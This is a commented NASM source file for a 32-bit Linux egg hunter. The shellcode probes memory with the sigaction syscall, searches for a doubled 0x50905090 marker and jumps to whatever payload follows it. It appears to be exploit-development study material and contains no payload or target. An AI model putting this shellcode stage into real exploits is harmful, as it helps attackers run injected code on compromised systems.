; Filename:	egg_hunter.nasm
; Author:	Jules Adriaens
; Assemble:	nasm -f elf32 -o egg_hunter.o egg_hunter.nasm
; Link:		ld -o egg_hunter egg_hunter.o

global _start

_start:

align_page:
    or cx, 0xfff	; ECX = 4095 (page alignment) -- Query with: getconf PAGE_SIZE
next_address:
    inc ecx		; ECX = 4096, correct page alignment
    push byte +0x43     ; sigaction(2) = 67
    pop eax		; EAX = 67
    int 0x80		; syscall
    cmp al,0xf2		; check for EFAULT (242)
    jz align_page	; if EFAULT: try next page
    mov eax, 0x50905090	; EGG in EAX
    mov edi, ecx	; address to validate
    scasd		; scan string: compare EAX with EDI, set status flags, increment EDI by 4 bytes
    jnz next_address	; if not equal: try next address
    scasd		; scan string: first 4 bytes are equal, compare next 4 bytes
    jnz next_address	; if not equal: try next address
    jmp edi		; EGG found! jump to payload
